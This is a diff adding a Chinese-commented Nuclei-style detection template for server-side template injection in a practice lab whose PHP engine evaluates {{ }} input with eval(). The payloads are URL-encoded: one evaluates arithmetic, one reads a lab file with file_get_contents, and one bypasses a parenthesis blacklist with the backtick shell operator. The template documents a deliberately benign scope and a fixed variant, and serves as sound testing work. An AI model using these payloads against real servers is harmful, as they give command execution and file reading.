@@ -1,0 +1,215 @@
+id: vulnlab-ssti-template-injection
+
+info:
+  name: SSTI（服务端模板注入）
+  severity: critical
+  author: hediwen
+  tags: [ssti, template-injection, rce, injection]
+
+  description: |
+    自研的轻量模板引擎把 `{{ }}` 里的内容交给 `eval()` 求值，
+    而 PHP 的「表达式」概念里包含函数调用 ——
+    于是「渲染模板」直接等同于「执行任意 PHP 表达式」。
+
+    本 PoC 覆盖两种失效方式：
+
+      ① **零过滤** —— 表达式里可以调用任意函数
+         （读文件、执行命令、`phpinfo()`……）
+
+      ② **黑名单挡括号** —— 思路是「不许调用函数」，
+         因为 PHP 调用函数需要 `(...)`。
+         但**反引号运算符不需要括号**：`` `cmd` `` 等价于
+         `shell_exec('cmd')`，于是绕过成立。
+
+    ⚠️ 本检测只执行**无害操作**：
+      · 读靶场自带的演示文件（内容是固定标记串）
+      · 执行一条 `echo` 命令（跨平台一致、无副作用）
+
+    不写文件、不反弹 shell、不做持久化。
+    真实授权测试中，SSTI 的验证应当到「证明能执行」为止 ——
+    因为它的能力上限就是 RCE，没必要真的去跑一个有破坏性的载荷。
+
+    ── 判据为什么必须限定在「渲染结果」区块里 ──
+
+    靶场页面会把提交的模板原样回显到输入框里。
+    标记串是我们自己提交的 payload 的一部分，所以**必然出现在页面上** ——
+    如果全文搜标记串，会无条件命中。
+
+    所以判据必须限定在渲染结果那个区块内：
+
+        渲染结果</h3> <pre> ... VULNLAB_SSTI_FILE_MARKER ... </pre>
+
+    这和 CMDI / XXE / JWT 场景是同一类问题，只是这里更极端：
+    payload 里带的 marker 会原封不动地出现在页面上，
+    **只有「渲染结果」里的 marker 才说明表达式被执行了。**
+
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Template_Injection
+    - https://portswigger.net/web-security/server-side-template-injection
+    - https://www.php.net/manual/en/language.operators.execution.php  # 反引号运算符
+
+requests:
+  # ── ① low 档：表达式被真的求值 ──────────────────────────────────
+  #
+  # 先用最小的载荷确认「{{ }} 里的内容确实被当代码执行了」：
+  #
+  #     {{ 7*7 }}  →  49
+  #
+  # 这一步比直接上读文件的载荷更能说明问题的性质 ——
+  # 它证明 `{{ }}` 里的内容被当成了**代码**，而不是**数据**。
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssti/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "template=%7B%7B%207%2A7%20%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 判据限定在「渲染结果」区块内
+      - type: regex
+        part: body
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>49"
+
+    extractors:
+      - type: regex
+        part: body
+        name: evaluated
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>(49)"
+
+  # ── ② low 档：表达式能读到服务器上的文件 ────────────────────────
+  #
+  # 「表达式」在 PHP 里包含函数调用，所以这一步不需要任何特殊技巧 ——
+  # `file_get_contents(...)` 就是一个普通的表达式。
+  #
+  # 这也是 SSTI 与「注入类漏洞」的区别所在：
+  # 攻击者不需要突破任何语法限制，因为**这个机制本来就要执行任意表达式**。
+  #
+  # 读的是靶场自带的演示文件（固定标记串）——
+  # 系统文件在不同机器上不一定存在、内容也不一样，
+  # 会让「到底读到没有」变成对环境的判断，而不是对漏洞的判断。
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssti/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "template=%7B%7B%20file_get_contents%28%27ssti_probe.txt%27%29%20%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>[^<]*VULNLAB_SSTI_FILE_MARKER"
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_file
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>([^<]{0,60})"
+
+  # ── ③ medium 档：反引号绕过「括号黑名单」 ───────────────────────
+  #
+  # 该档不许表达式里出现 `(` `)` —— 思路是「不许调用函数」，
+  # 因为 PHP 里调用函数的写法是 `func(...)`。
+  #
+  # 但 PHP 的**运算符**列表里有一个能执行命令的：
+  #
+  #     `command`
+  #
+  # 反引号运算符等价于 `shell_exec()` —— 执行一段 shell 命令并返回输出。
+  # 整个写法里**没有一个括号**。
+  #
+  # 用 `echo` 而不是 `whoami` / `id`：`echo` 在 Windows 的 cmd
+  # 和 Linux 的 sh 上行为一致，判据可以跨平台复用。
+  #
+  # ── 这里原本还有一条负向判据，后来删掉了 ──
+  #
+  # 最初写的是 `words: ["[已被过滤]"], negative: true`，
+  # 结果**真实命中的响应被它否掉了**：medium 档页面上会展示那段防护代码，
+  # 而代码里就有 `'[已被过滤]'` 这个字面量 —— 负向词在"说明文字"里也出现了。
+  #
+  # 教训：负向判据不该用来表达「我没成功」这种意思，
+  # 它太容易被页面的说明性文字误伤。
+  # 这里的正向判据已经把范围限定在渲染结果区块内，
+  # 被拦时那个区块里不可能出现 marker —— 负向判据本来就是多余的。
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssti/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "template=%7B%7B%20%60echo%20VULNLAB_SSTI_CMD_MARKER%60%20%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>[^<]*VULNLAB_SSTI_CMD_MARKER"
+
+    extractors:
+      - type: regex
+        part: body
+        name: bypass_variant
+        regex:
+          - "`echo[^`]*`"
+
+  # ── ④ medium 档对照组：带括号的载荷应被拦下 ─────────────────────
+  #
+  # 这一条**不应该命中**。它的作用是把「通过」归因给反引号那个绕过点：
+  # 证明该档的括号黑名单确实在工作，不是「什么都不管」。
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssti/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "template=%7B%7B%20file_get_contents%28%27ssti_probe.txt%27%29%20%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>[^<]*VULNLAB_SSTI_FILE_MARKER"
+
+  # ── ⑤ high 档：修复对照（预期不命中）────────────────────────────
+  #
+  # high 档**取消了表达式求值** —— 模板里只允许引用预定义的变量名：
+  #
+  #     ① 语法收窄：必须是合法标识符（`^[a-z_][a-z0-9_]*$`）
+  #     ② 白名单查表：不在变量表里就拒绝
+  #     ③ 整个文件没有 eval
+  #
+  # 所以 `7*7` 连格式检查都过不去。这一条如果命中了，
+  # 说明有人把 eval 又加回来了。
+  - method: POST
+    path:
+      - "{{BaseURL}}/ssti/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "template=%7B%7B%20%60echo%20VULNLAB_SSTI_CMD_MARKER%60%20%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "渲染结果</h3>\\s*<pre[^>]*>[^<]*VULNLAB_SSTI_CMD_MARKER"
